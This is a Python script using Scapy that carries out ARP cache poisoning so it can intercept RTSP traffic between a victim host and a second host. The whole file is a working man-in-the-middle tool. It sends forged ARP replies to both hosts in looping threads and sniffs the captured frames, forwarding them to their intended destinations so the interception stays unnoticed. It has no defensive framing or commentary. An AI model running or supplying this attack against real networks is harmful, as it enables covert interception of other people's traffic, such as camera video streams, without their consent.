# Scapy ARP poisoning to intercept RTSP packets

from threading import Thread
from scapy.all import Ether, ARP, getmacbyip, conf, get_if_addr, get_if_hwaddr, sendp, sniff
import sys


def poison(iface, iface_mac, target_ip, target_mac, source_ip):
    packet = Ether() / ARP()
    packet[Ether].src = iface_mac
    packet[ARP].hwsrc = iface_mac
    packet[ARP].psrc = source_ip
    packet[ARP].hwdst = target_mac
    packet[ARP].pdst = target_ip
    sendp(packet, iface=iface, inter=1, loop=1)


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Incorrect number of arguments!")
        exit(1)

    victim_ip = sys.argv[1]
    victim_mac = getmacbyip(victim_ip)

    spoof_ip = sys.argv[2]
    spoof_mac = getmacbyip(spoof_ip)

    attacker_iface = conf.iface
    attacker_ip = get_if_addr(attacker_iface)
    attacker_mac = get_if_hwaddr(attacker_iface)

    def poison_victim():
        poison(attacker_iface, attacker_mac, victim_ip, victim_mac, spoof_ip)

    def poison_spoof():
        poison(attacker_iface, attacker_mac, spoof_ip, spoof_mac, victim_ip)

    def forward_packets():
        def forward(pkt):
            if pkt[Ether].src == victim_mac:
                pkt[Ether].dst = spoof_mac
            else:
                pkt[Ether].dst = victim_mac
            sendp(pkt)
        sniff(
            prn=forward,
            filter="ip and (ether src %s or ether src %s)" % (
                victim_mac, spoof_mac)
        )

    Thread(target=poison_victim).start()
    Thread(target=poison_spoof).start()
    Thread(target=forward_packets).start()
